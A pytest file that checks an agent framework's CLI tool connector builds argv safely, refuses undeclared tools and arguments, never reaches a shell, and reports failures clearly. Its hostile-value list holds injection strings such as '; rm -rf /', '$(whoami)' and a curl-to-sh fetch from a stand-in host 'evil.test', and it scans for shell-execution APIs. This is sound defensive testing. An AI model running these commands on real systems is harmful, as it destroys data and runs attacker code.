"""CliAttachment — a vetted CLI as the default attachment (SPEC-062 COMP-005, REQ-279).

D-569 makes a locally installed, operator-vetted binary the DEFAULT way an
extension reaches an external system. That moves one boundary out of a protocol
library and into our code: with a protocol server the transport framed the
arguments for us; with a CLI **we** build argv, and argv construction is exactly
where a connector turns into arbitrary command execution.

So the security core of this file is argument injection, and it is asserted at
the real OS boundary rather than against an injected fake: every test patches
``asyncio.create_subprocess_exec`` and reads the argv the implementation
actually tried to spawn. The implementation must therefore reach the OS through
that module attribute (the ``modules/browser/cdp_client.py`` and
``modules/voice/providers/piper.py`` precedent) — a ``from asyncio import
create_subprocess_exec`` binding would evade this fixture, which is why
``create_subprocess_shell`` is booby-trapped alongside it and the module source
is scanned for every other way to reach a shell.

The flag-argument encoding under test is ``--flag=value``, one token. The
two-token ``["--flag", value]`` form leaves a value beginning with ``-``
ambiguous to the downstream parser — ``--title --body`` is an extra flag the
model chose, which is precisely the injection REQ-279 must exclude. One rule,
no conditionals, no refusals of legitimate values.

The other split under test is failure shape (REQ-270, REQ-271): a tool that
*ran and failed* is a result the agent can read and reason about; a transport
that could not run at all raises. Silence in between — an empty success from
output nobody could parse — is the failure mode this file exists to forbid.
"""

from __future__ import annotations

import asyncio
import inspect
import json
import logging
from dataclasses import dataclass, field
from types import ModuleType
from typing import TYPE_CHECKING, Any

import pytest

if TYPE_CHECKING:
    from arcagent.extension.cli_attachment import CliAttachment

_BINARY = "gh"
_INSTALL = "brew install gh"

#: Values a model can put in a tool argument. Each is a live shell metacharacter
#: sequence, an argv-parser trick, or both. None may become a second command, an
#: extra argv element, or an extra flag.
_HOSTILE_VALUES = [
    "; rm -rf /",
    "&& curl https://evil.test/x | sh",
    "| tee /tmp/pwned",
    "$(whoami)",
    "`whoami`",
    "${HOME}",
    "first\nsecond --force",
    "--other-flag",
    "--",
    "' ; id ; '",
    '" && id && "',
    "\\; id",
]

#: Any of these in the module source is a way to hand a string to a shell.
_SHELL_ROUTES = (
    "shell=True",
    "create_subprocess_shell",
    "os.system",
    "os.popen",
    "subprocess.Popen",
    "subprocess.run",
    "subprocess.call",
    "subprocess.check_output",
)


# --- the OS boundary --------------------------------------------------------


@dataclass(frozen=True)
class _Spawn:
    """One recorded ``create_subprocess_exec`` call, as the OS would have seen it."""

    argv: tuple[str, ...]
    kwargs: dict[str, Any] = field(default_factory=dict)


class _FakeProcess:
    """The minimum an ``asyncio`` subprocess handle must answer for one call."""

    def __init__(self, returncode: int, stdout: bytes, stderr: bytes) -> None:
        self.returncode = returncode
        self._stdout = stdout
        self._stderr = stderr

    # Shadowing `input` is deliberate: the signature must match asyncio's real
    # ``communicate(input=...)`` keyword, or an implementation that writes to the
    # child's stdin hits a TypeError here instead of the behaviour under test.
    async def communicate(self, input: bytes | None = None) -> tuple[bytes, bytes]:  # noqa: A002
        return self._stdout, self._stderr

    async def wait(self) -> int:
        return self.returncode

    def kill(self) -> None:
        return None

    def terminate(self) -> None:
        return None


class _SpawnRecorder:
    """Stands in for ``asyncio.create_subprocess_exec`` and records the real argv.

    ``create_subprocess_exec(program, *args)`` spreads argv as positionals, so
    ``argv`` here is the exact token list the kernel would have received — one
    element per token, with no shell between the model's value and the process.
    """

    def __init__(
        self,
        *,
        returncode: int = 0,
        stdout: bytes = b"{}",
        stderr: bytes = b"",
        raises: BaseException | None = None,
    ) -> None:
        self.spawns: list[_Spawn] = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr
        self.raises = raises

    async def __call__(self, program: str, *args: str, **kwargs: Any) -> _FakeProcess:
        self.spawns.append(_Spawn(argv=(program, *args), kwargs=dict(kwargs)))
        if self.raises is not None:
            raise self.raises
        return _FakeProcess(self.returncode, self.stdout, self.stderr)

    @property
    def argv(self) -> list[str]:
        assert self.spawns, "nothing was spawned"
        return list(self.spawns[-1].argv)


async def _shell_is_forbidden(*args: Any, **kwargs: Any) -> Any:
    raise AssertionError("a shell was used to run a CLI tool — argv must go straight to exec")


@pytest.fixture
def spawn(monkeypatch: pytest.MonkeyPatch) -> _SpawnRecorder:
    """Patch the exec boundary, and make the shell boundary explode if reached."""
    recorder = _SpawnRecorder()
    monkeypatch.setattr(asyncio, "create_subprocess_exec", recorder)
    monkeypatch.setattr(asyncio, "create_subprocess_shell", _shell_is_forbidden)
    return recorder


# --- the attachment under test ----------------------------------------------


def _module() -> ModuleType:
    import arcagent.extension.cli_attachment as module

    return module


def _attachment() -> CliAttachment:
    """A two-command CLI: one writing command with flags, one read-only command."""
    module = _module()
    create = module.CliCommand(
        tool="create_issue",
        argv=["issue", "create"],
        arguments=[
            module.CliArgument(name="title", flag="--title"),
            module.CliArgument(name="body", flag="--body"),
        ],
        description="Open an issue",
        capability_tags=["network_egress"],
    )
    listing = module.CliCommand(
        tool="list_issues",
        argv=["issue", "list"],
        description="List issues",
        classification="read_only",
    )
    return module.CliAttachment(
        binary=_BINARY,
        commands=[create, listing],
        probe_argv=["--version"],
        install_instruction=_INSTALL,
    )


@pytest.fixture
def cli() -> CliAttachment:
    return _attachment()


# --- the hook contract (REQ-279, REQ-262) -----------------------------------


def test_satisfies_the_extension_attachment_protocol(cli: CliAttachment) -> None:
    """A CLI attaches through the same four methods as everything else."""
    from arcagent.extension.attachment import ExtensionAttachment

    assert isinstance(cli, ExtensionAttachment)


def test_requirements_declare_the_binary_as_a_host_prerequisite(cli: CliAttachment) -> None:
    """Arc directs the operator to install it and never installs it itself (REQ-262)."""
    from arcagent.extension.attachment import RequirementKind

    requirements = cli.requirements()

    assert [r.name for r in requirements] == [_BINARY]
    assert requirements[0].kind is RequirementKind.HOST
    assert requirements[0].instruction == _INSTALL


async def test_describe_tools_returns_one_named_tool_per_declared_command(
    cli: CliAttachment,
) -> None:
    """Each declared CLI command is its own named verb, not one generic runner."""
    specs = await cli.describe_tools()

    assert sorted(spec.name for spec in specs) == ["create_issue", "list_issues"]


async def test_declared_arguments_become_the_input_schema(cli: CliAttachment) -> None:
    """The schema is what the registry validates against, so it must be the manifest's."""
    specs = {spec.name: spec for spec in await cli.describe_tools()}

    properties = specs["create_issue"].input_schema.get("properties", {})
    assert sorted(properties) == ["body", "title"]
    assert specs["list_issues"].input_schema.get("properties", {}) == {}


async def test_classification_and_tags_travel_with_the_tool(cli: CliAttachment) -> None:
    """These feed the trifecta gate, so they must not be inferred at the call site."""
    specs = {spec.name: spec for spec in await cli.describe_tools()}

    assert specs["list_issues"].classification == "read_only"
    assert specs["create_issue"].classification == "state_modifying"
    assert specs["create_issue"].capability_tags == ["network_egress"]


def test_an_undeclared_classification_defaults_to_the_restrictive_value() -> None:
    """Silence never buys a command the cheap treatment (REQ-269)."""
    module = _module()

    command = module.CliCommand(tool="unclassified", argv=["do", "thing"])

    assert command.classification == "state_modifying"


# --- argv construction: the security core (REQ-279) -------------------------


async def test_argv_reaches_exec_as_separate_tokens_never_a_shell_string(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    await cli.invoke("create_issue", {"title": "hello"})

    assert spawn.argv == [_BINARY, "issue", "create", "--title=hello"]
    assert all(isinstance(token, str) for token in spawn.argv)
    assert spawn.spawns[-1].kwargs.get("shell") in (None, False)


def test_the_module_has_no_route_to_a_shell() -> None:
    """A patched boundary proves the happy path; the source proves there is no other."""
    source = inspect.getsource(_module())

    assert [route for route in _SHELL_ROUTES if route in source] == []


@pytest.mark.parametrize("value", _HOSTILE_VALUES)
async def test_a_hostile_argument_value_stays_one_inert_token(
    cli: CliAttachment, spawn: _SpawnRecorder, value: str
) -> None:
    """No metacharacter may split a value, add a token, or start a second command."""
    await cli.invoke("create_issue", {"title": value})

    assert spawn.argv == [_BINARY, "issue", "create", f"--title={value}"]


async def test_a_value_that_looks_like_a_flag_cannot_occupy_a_flag_position(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """``--flag=value`` is what makes this unambiguous to the downstream parser."""
    await cli.invoke("create_issue", {"title": "--body", "body": "real"})

    assert spawn.argv == [_BINARY, "issue", "create", "--title=--body", "--body=real"]
    # Every token after the fixed command is one of OUR declared flags.
    assert [token.split("=", 1)[0] for token in spawn.argv[3:]] == ["--title", "--body"]


async def test_an_omitted_argument_contributes_no_token(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """A dangling flag would swallow the next token and shift the whole parse."""
    await cli.invoke("create_issue", {"title": "hello"})

    assert "--body" not in " ".join(spawn.argv)


async def test_an_undeclared_argument_is_refused_and_nothing_spawns(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """``invoke`` receives validated args; an unknown key means validation was bypassed."""
    from arcagent.core.errors import ExtensionError

    with pytest.raises(ExtensionError):
        await cli.invoke("create_issue", {"title": "hello", "--force": "yes"})

    assert spawn.spawns == []


async def test_an_undeclared_tool_is_refused_and_nothing_spawns(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """Only manifest-declared commands invoke — the allowlist is the whole surface."""
    from arcagent.core.errors import ExtensionError

    with pytest.raises(ExtensionError):
        await cli.invoke("delete_repo", {})

    assert spawn.spawns == []


async def test_the_binary_is_never_taken_from_the_arguments(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """argv[0] comes from the manifest and from nowhere else."""
    await cli.invoke("create_issue", {"title": "curl"})

    assert spawn.argv[0] == _BINARY


# --- results: what ran and failed vs what could not run (REQ-270, REQ-271) --


async def test_stdout_json_becomes_an_ok_tool_result(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    from arcagent.extension.attachment import ToolOutcome

    spawn.stdout = json.dumps({"number": 42, "url": "https://example.test/1"}).encode()

    result = await cli.invoke("create_issue", {"title": "hello"})

    assert result.tool == "create_issue"
    assert result.outcome is ToolOutcome.OK
    assert "42" in result.content


async def test_stderr_on_a_successful_call_is_captured_but_is_not_a_failure(
    cli: CliAttachment, spawn: _SpawnRecorder, caplog: pytest.LogCaptureFixture
) -> None:
    """Countless CLIs write progress to stderr; treating that as failure breaks them."""
    from arcagent.extension.attachment import ToolOutcome

    spawn.stdout = json.dumps({"number": 42}).encode()
    spawn.stderr = b"warning: rate limit at 80%"

    with caplog.at_level(logging.WARNING):
        result = await cli.invoke("create_issue", {"title": "hello"})

    assert result.outcome is ToolOutcome.OK
    assert "42" in result.content
    assert any("rate limit at 80%" in message for message in caplog.messages)


async def test_a_non_zero_exit_becomes_a_readable_error_result_and_does_not_raise(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """The tool ran and failed — the agent must be able to read why and act on it."""
    from arcagent.extension.attachment import ToolOutcome

    spawn.returncode = 2
    spawn.stdout = b""
    spawn.stderr = b"could not resolve repository owner"

    result = await cli.invoke("create_issue", {"title": "hello"})

    assert result.outcome is ToolOutcome.ERROR
    assert "could not resolve repository owner" in result.content
    assert "2" in result.content


async def test_unparseable_stdout_never_becomes_a_silent_empty_success(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """An empty OK here is the worst outcome: the agent proceeds as if it worked."""
    from arcagent.extension.attachment import ToolOutcome

    spawn.returncode = 0
    spawn.stdout = b"Creating issue... done{{{"

    result = await cli.invoke("create_issue", {"title": "hello"})

    assert result.outcome is ToolOutcome.ERROR
    assert result.content.strip() != ""
    assert "Creating issue... done{{{" in result.content


async def test_a_missing_binary_raises_a_transport_failure(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """Nothing ran, so there is no tool result to reason about — this is not an outcome."""
    from arcagent.core.errors import ExtensionError

    spawn.raises = FileNotFoundError(2, "No such file or directory", _BINARY)

    with pytest.raises(ExtensionError) as excinfo:
        await cli.invoke("create_issue", {"title": "hello"})

    assert _BINARY in str(excinfo.value)


# --- probe (REQ-279) --------------------------------------------------------


async def test_probe_reports_reachable_and_the_declared_tools(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    spawn.stdout = b"gh version 2.60.0"

    result = await cli.probe()

    assert result.reachable is True
    assert sorted(spec.name for spec in result.tools) == ["create_issue", "list_issues"]
    assert spawn.argv == [_BINARY, "--version"]


async def test_probe_reports_unreachable_rather_than_raising_when_the_binary_is_absent(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """Probing IS the reachability test — it answers, it does not blow up."""
    spawn.raises = FileNotFoundError(2, "No such file or directory", _BINARY)

    result = await cli.probe()

    assert result.reachable is False
    assert _BINARY in result.detail


# --- positional arguments (SPEC-064) ----------------------------------------
#
# `acli jira workitem view` takes the work item key POSITIONALLY: `--key` is
# rejected outright ("unknown flag: --key", measured on the deployment). A
# connector that could only emit `--flag=value` could not express that verb at
# all, so the bundle would ship without `jira_get_issue`.
#
# The module's guarantee is that a value can never be read as syntax, and a bare
# token would break it — `--other-flag` in a positional slot IS a flag to the
# downstream parser. So a positional is legal only after a `--` the MANIFEST
# declares, which ends flag parsing for everything that follows; and a command
# using one may declare no flag arguments, because a flag token emitted after
# `--` would silently become a positional.


def _positional_attachment() -> CliAttachment:
    """One command taking its only argument positionally, after a declared ``--``."""
    module = _module()
    view = module.CliCommand(
        tool="view_item",
        argv=["workitem", "view", "--json", "--"],
        arguments=[module.CliArgument(name="issue_key", description="Work item key")],
        description="Read one work item",
        classification="read_only",
    )
    return module.CliAttachment(binary="acli", commands=[view], probe_argv=["--version"])


async def test_a_positional_argument_is_placed_bare_after_the_declared_terminator(
    spawn: _SpawnRecorder,
) -> None:
    """The value is its own token, with no flag in front of it and nothing joined to it."""
    await _positional_attachment().invoke("view_item", {"issue_key": "KAN-68"})

    assert spawn.argv == ["acli", "workitem", "view", "--json", "--", "KAN-68"]


@pytest.mark.parametrize("value", _HOSTILE_VALUES)
async def test_a_positional_value_the_parser_would_read_as_syntax_stays_a_value(
    spawn: _SpawnRecorder, value: str
) -> None:
    """The declared ``--`` is what makes a bare token safe; it is always in front."""
    await _positional_attachment().invoke("view_item", {"issue_key": value})

    argv = spawn.argv
    assert argv == ["acli", "workitem", "view", "--json", "--", value]
    assert argv.index("--") < len(argv) - 1


def test_a_positional_argument_with_no_declared_terminator_is_refused_at_load() -> None:
    """Without ``--`` the value occupies a flag position, which is the injection."""
    module = _module()
    with pytest.raises(ValueError, match="--"):
        module.CliCommand(
            tool="view_item",
            argv=["workitem", "view", "--json"],
            arguments=[module.CliArgument(name="issue_key")],
        )


def test_a_terminator_that_is_not_the_last_fixed_token_is_refused_at_load() -> None:
    """A token after ``--`` is already a positional, so the value would be the second one."""
    module = _module()
    with pytest.raises(ValueError, match="--"):
        module.CliCommand(
            tool="view_item",
            argv=["workitem", "view", "--", "--json"],
            arguments=[module.CliArgument(name="issue_key")],
        )


def test_a_command_may_take_both_a_positional_and_flags_in_a_safe_order() -> None:
    """Real binaries need both: a search verb with a query and paging flags.

    Order is what makes it safe. Every flag goes BEFORE the terminator and every
    value after it, so a value can never land in a flag position and a flag can
    never be read as a value.
    """
    module = _module()
    command = module.CliCommand(
        tool="search_items",
        argv=["messages", "search", "--json", "--"],
        arguments=[
            module.CliArgument(name="query"),
            module.CliArgument(name="limit", flag="--max"),
        ],
    )

    argv = command.argv_for({"query": "label:INBOX", "limit": "50"})

    assert argv == ["messages", "search", "--json", "--max=50", "--", "label:INBOX"]
    assert argv.index("--max=50") < argv.index("--")


def test_a_command_with_only_flags_appends_them_as_before() -> None:
    module = _module()
    command = module.CliCommand(
        tool="list_items",
        argv=["items", "list", "--json"],
        arguments=[module.CliArgument(name="limit", flag="--max")],
    )

    assert command.argv_for({"limit": "5"}) == ["items", "list", "--json", "--max=5"]


def _configured_attachment(values: dict[str, str]) -> CliAttachment:
    module = _module()
    listing = module.CliCommand(
        tool="list_items",
        argv=["item", "list", "--format=json", "--vault={vault_id}"],
        arguments=[module.CliArgument(name="tags", flag="--tags")],
        classification="read_only",
    )
    return module.CliAttachment(
        binary="op", commands=[listing], probe_argv=["--version"], values=values
    )


async def test_a_configured_value_is_filled_into_the_fixed_argv(
    spawn: _SpawnRecorder,
) -> None:
    await _configured_attachment({"vault_id": "Engineering"}).invoke("list_items", {})

    assert spawn.argv == ["op", "item", "list", "--format=json", "--vault=Engineering"]


async def test_a_configured_value_with_spaces_stays_one_argv_token(
    spawn: _SpawnRecorder,
) -> None:
    """A vault named by a person can contain anything a vault name can contain."""
    await _configured_attachment({"vault_id": "Shared Ops; rm -rf /"}).invoke("list_items", {})

    assert spawn.argv == ["op", "item", "list", "--format=json", "--vault=Shared Ops; rm -rf /"]


async def test_a_model_argument_is_never_a_substitution_target(
    spawn: _SpawnRecorder,
) -> None:
    """A model writing ``{vault_id}`` must not thereby read the configured value."""
    await _configured_attachment({"vault_id": "Engineering"}).invoke(
        "list_items", {"tags": "{vault_id}"}
    )

    assert spawn.argv[-1] == "--tags={vault_id}"


async def test_an_unfilled_placeholder_is_left_alone_rather_than_guessed(
    spawn: _SpawnRecorder,
) -> None:
    """The binary's own refusal names the flag; a blank would silently read every vault."""
    await _configured_attachment({}).invoke("list_items", {})

    assert spawn.argv[-1] == "--vault={vault_id}"


# --- a verb whose whole payload is one opaque value ---------------------------
#
# `op read` prints the secret itself and has no `--format` at all. Every other
# declared command answers JSON, and a CliAttachment reports non-JSON stdout as a
# tool ERROR — correctly, because for those verbs it means something went wrong.
# For this one it is the answer. So a command may DECLARE that its output is text,
# and only a command that declares it is exempt.


def _text_attachment() -> CliAttachment:
    module = _module()
    read = module.CliCommand(
        tool="resolve_secret",
        argv=["read", "--"],
        arguments=[module.CliArgument(name="reference")],
        output="text",
        classification="read_only",
    )
    return module.CliAttachment(binary="op", commands=[read], probe_argv=["--version"])


async def test_a_command_declaring_text_output_returns_what_it_printed(
    spawn: _SpawnRecorder,
) -> None:
    spawn.stdout = b"correct-horse-battery-staple\n"

    result = await _text_attachment().invoke("resolve_secret", {"reference": "op://v/i/password"})

    assert result.outcome.value == "ok"
    assert result.content == "correct-horse-battery-staple"


async def test_a_command_that_did_not_declare_text_output_still_demands_json(
    cli: CliAttachment, spawn: _SpawnRecorder
) -> None:
    """The exemption is opt-in, so no other verb loses the check it depends on."""
    spawn.stdout = b"https://github.com/o/r/pull/1\n"

    result = await cli.invoke("list_issues", {})

    assert result.outcome.value == "error"
    assert "not the declared JSON" in result.content


async def test_a_text_command_that_printed_nothing_is_never_a_silent_success(
    spawn: _SpawnRecorder,
) -> None:
    """An empty answer from a secret resolve is a failure wearing a success's clothes."""
    spawn.stdout = b""

    result = await _text_attachment().invoke("resolve_secret", {"reference": "op://v/i/password"})

    assert result.outcome.value == "error"


async def test_a_text_command_that_exited_non_zero_is_still_an_error(
    spawn: _SpawnRecorder,
) -> None:
    spawn.returncode = 1
    spawn.stdout = b""
    spawn.stderr = b"[ERROR] could not read secret"

    result = await _text_attachment().invoke("resolve_secret", {"reference": "op://v/i/x"})

    assert result.outcome.value == "error"
    assert "could not read secret" in result.content


async def test_the_child_never_inherits_stdin(cli: CliAttachment, spawn: _SpawnRecorder) -> None:
    """A spawned CLI must not be able to block on the service's stdin.

    Unset ``stdin`` means the child INHERITS the parent's. A vendor CLI that
    prompts (a confirmation, a missing field, an editor) then blocks until the
    tool deadline instead of failing: `jira_create_issue` and
    `jira_transition_issue` both died on the 30s cap this way, taking the whole
    nightly workflow down, while the same commands run by hand with
    ``< /dev/null`` returned in under three seconds.
    """
    await cli.invoke("create_issue", {"title": "hello"})

    assert spawn.spawns[-1].kwargs.get("stdin") is asyncio.subprocess.DEVNULL


def test_a_templated_argument_lets_the_manifest_own_the_shape() -> None:
    """`gh api <endpoint>` is the whole read surface of an API in one token.

    With a template the manifest owns the shape and the caller fills one slot,
    so a repository crawl can be exposed without also granting every org, user
    and gist the account can see.
    """
    module = _module()
    command = module.CliCommand(
        tool="repo_tree",
        argv=["api", "--"],
        arguments=[
            module.CliArgument(name="repo", template="repos/{value}/git/trees/HEAD?recursive=1")
        ],
    )

    assert command.argv_for({"repo": "arc/arc"}) == [
        "api",
        "--",
        "repos/arc/arc/git/trees/HEAD?recursive=1",
    ]


def test_a_template_with_no_slot_is_refused_at_load() -> None:
    """It would send a fixed token and silently ignore what the caller asked for."""
    module = _module()
    with pytest.raises(ValueError, match="value"):
        module.CliArgument(name="repo", template="repos/fixed/tree")


def test_a_template_that_repeats_the_slot_is_refused_at_load() -> None:
    module = _module()
    with pytest.raises(ValueError, match="value"):
        module.CliArgument(name="repo", template="repos/{value}/{value}")


def test_a_templated_flag_argument_still_renders_as_one_token() -> None:
    module = _module()
    command = module.CliCommand(
        tool="search",
        argv=["search"],
        arguments=[module.CliArgument(name="label", flag="--query", template="label:{value}")],
    )

    assert command.argv_for({"label": "INBOX"}) == ["search", "--query=label:INBOX"]
